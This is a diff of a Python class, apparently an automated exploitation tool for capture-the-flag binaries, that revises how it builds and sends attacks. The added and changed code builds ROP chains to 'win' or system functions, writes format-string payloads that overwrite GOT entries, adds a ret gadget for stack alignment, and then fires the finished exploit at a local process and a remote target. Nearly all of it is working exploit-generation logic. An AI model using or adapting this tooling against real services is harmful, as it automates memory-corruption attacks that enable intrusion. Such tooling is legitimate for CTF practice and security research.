@@ -88,6 +88,10 @@ class Aegis:
                 self.against.format_leak()
 
                 if self.against.flag == None:
+                    if function == "win":
+                        got_addr = self.elf.got[self.got_targets[-1]]
+                        self.against.format_write(self.elf.sym["win"], got_addr)
+
                     if win_gadget:
                         got_addr = self.elf.got[self.got_targets[-1]]
                         self.against.format_write(win_gadget, got_addr)
@@ -97,17 +101,16 @@ class Aegis:
 
         else: 
 
-            # Check if one call functions are in the binary
             if win_gadget:
                 aegis_log.debug(f"Setting up return to win with gadget")
-                #if self.failed:
-                    #self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                 self.against.chain += p64(win_gadget)
                 self.against.exploit = self.against.padding + self.against.chain
+
             elif function == "win":
-                aegis_log.debug(f"Setting up return to win with function")
+                aegis_log.debug(f"setting up return to win with function")
                 self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
                 self.against.exploit = self.against.padding + self.against.chain
+
             elif function == "system":
                 aegis_log.debug(f"Setting up return to system")
                 if not string:
@@ -151,60 +154,49 @@ class Aegis:
     def exploit(self):
         """Create and run exploit using Against module."""
         aegis_log.debug(f"Setting up exploit")
-        chain_len = len(self.against.chain)
+        chain_len = len(self.against.chain) if self.against.chain is not None else 0
+        format_len = len(self.against.format_exploit) if self.against.format_exploit is not None else 0
         exp = open("exploit", "wb")
 
         if chain_len > 0:
             aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
         else:
-            aegis_log.debug(f"Sending format string payload {self.against.format_exploit}")
+            aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
         if args.GDB:
-            self.against.process = self.against.start("GDB")
-            self.against.send_exploit()
-            #self.against.verify_flag()
-
+            option = "GDB"
+        else:
+            option = ""
+        self.against.process = self.against.start(option)
+        self.against.send_exploit()
+        if self.against.verify_flag() == False:
             aegis_log.debug(f"Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
-                
             chain_len = len(self.against.chain)
-            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
-            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
-
-            self.against.process = self.against.start("GDB")
-            self.against.send_exploit()
-            #self.against.verify_flag()
-        
-        else:
-            self.against.process = self.against.start("")
-            self.against.send_exploit()
-            aegis_log.debug(f"Sent exploit")
-            if self.against.verify_flag() == False:
-                ret = p64(self.rop.find_gadget(["ret"])[0])
-                chain_len = len(self.against.chain)
+            if chain_len != 0:
                 aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
                 self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
-                self.against.process = self.against.start("")
+            else:
+                aegis_log.debug(f"Stack Alignment Check: {(format_len + 8) % 16}")
+                self.against.format_exploit = self.against.format_exploit + ret
 
-                self.against.send_exploit()
-                #exp.write(self.against.exploit)
+            self.against.process = self.against.start(option)
+            self.against.send_exploit()
+            self.against.verify_flag()
 
-                aegis_log.debug(f"Sent exploit")
-                self.against.verify_flag()# == False:
-                if self.against.flag != None:
+            if self.against.flag != None:
+                    aegis_log.debug(f"Sending exploit to remote")
+                    self.against.process = self.against.start("REMOTE")
+                    self.against.send_exploit()                    
+                    self.against.verify_flag()
+                    aegis_log.debug(f"Sent exploit to remote")
+        else:
+            if self.against.flag != None:
                     aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()
-                    
                     self.against.verify_flag()
                     aegis_log.debug(f"Sent exploit to remote")
-            else:
-                exp.write(self.against.exploit)
-                self.against.process = self.against.start("REMOTE")
-                aegis_log.debug(f"Sending exploit to remote")
-                self.against.send_exploit()
-                self.against.verify_flag()
-                aegis_log.debug(f"Sent exploit to remote")
  
 def print_title():
 
